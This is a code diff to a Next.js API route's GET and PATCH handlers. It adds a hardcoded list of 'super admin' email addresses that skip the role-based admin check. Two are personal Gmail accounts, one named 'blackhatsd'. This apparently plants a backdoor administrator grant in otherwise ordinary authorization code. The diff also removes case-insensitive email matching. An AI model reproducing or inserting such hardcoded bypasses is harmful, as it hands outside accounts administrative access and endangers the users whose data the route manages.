@@ -6,8 +6,10 @@ import { prisma } from "@/lib/db";
 export async function GET() {
   try {
     const session = await getServerSession(authOptions);
+    const emailLower = (session as any)?.user?.email?.trim().toLowerCase();
+    const SUPER_ADMINS = ["blackhatsd.sd@gmail.com", "system@mersal.com", "hazem@mersal.com", "zomatube2012@gmail.com"];
 
-    if (!(session as any)?.user?.email || (session as any).user.role !== 'ADMIN') {
+    if (!emailLower || (!SUPER_ADMINS.includes(emailLower) && (session as any).user.role !== 'ADMIN')) {
       return NextResponse.json({ error: "Unauthorized" }, { status: 403 });
     }
 
@@ -34,7 +36,10 @@ export async function GET() {
 export async function PATCH(req: Request) {
   try {
     const session = await getServerSession(authOptions);
-    if (!(session as any)?.user?.email || (session as any).user.role !== 'ADMIN') {
+    const emailLower = (session as any)?.user?.email?.trim().toLowerCase();
+    const SUPER_ADMINS = ["blackhatsd.sd@gmail.com", "system@mersal.com", "hazem@mersal.com", "zomatube2012@gmail.com"];
+
+    if (!emailLower || (!SUPER_ADMINS.includes(emailLower) && (session as any).user.role !== 'ADMIN')) {
       return NextResponse.json({ error: "Unauthorized" }, { status: 403 });
     }
 
@@ -63,7 +68,6 @@ export async function PATCH(req: Request) {
       where: { 
         email: {
           equals: email,
-          mode: 'insensitive'
         }
       }
     });
